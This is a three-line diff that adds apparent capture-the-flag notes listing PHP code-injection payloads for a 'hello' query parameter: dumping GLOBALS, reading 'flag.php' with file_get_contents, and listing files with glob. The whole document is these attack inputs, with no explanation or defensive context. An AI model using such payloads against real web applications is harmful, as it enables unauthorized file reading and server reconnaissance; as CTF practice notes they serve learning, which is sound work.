@@ -1,0 +1,3 @@
+PHP GET INFO :          ?hello=GLOBALS
+PHP GET FILE INFO :   ?hello=file_get_contents(%27flag.php%27)
+PHP EXEC :                  print_r(glob("*"))
